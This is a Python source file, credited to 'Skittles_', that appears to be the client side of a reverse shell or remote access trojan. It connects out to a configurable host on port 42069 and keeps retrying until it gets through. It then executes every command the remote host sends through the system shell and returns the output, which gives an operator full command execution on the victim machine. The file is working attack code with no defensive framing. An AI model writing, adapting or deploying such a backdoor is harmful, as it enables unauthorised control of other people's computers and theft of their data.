#Written by Skittles_

#Imports
import os
import sys
import time
import random
import socket
import subprocess

#Variables
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection = False
lhost = ""
lport = 42069
operateSystem = ''

#Functions
def sendMessage(msg):
  s.send(msg.encode('UTF-8'))

def getInstructions():
  while True:
    msg = s.recv(4096)
    fromHost = msg.decode("UTF-8")
    #Decode message, check for ping command and reply back with ping confirmation.
    if fromHost == 'ping':
     try:
         sendMessage('PING! Connection Working!')


     except:
         pass

     getInstructions()

    if fromHost == 'os':
        try:
            sendMessage(os.name)

        except:
            pass

        getInstructions()

    if fromHost == 'Disconn':
        try:
            sendMessage('Disconnected From Server.')
        except:
            pass

        s.close()
        sys.exit()

    else:
        proc = subprocess.Popen(fromHost, stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()
        try:
           sendMessage(str(out))

        except:
            pass

        getInstructions()

#Connection to host.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while connection == False:
  try:
    print('Connecting...')
    s.connect((lhost, lport))
    connection = True
    print('Connected to Host.')

    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

  except:
    rndSleepAmt = random.randint(20, 30)
    time.sleep(rndSleepAmt)

#Begin recieving instructions.
getInstructions()

#Written by Skittles_
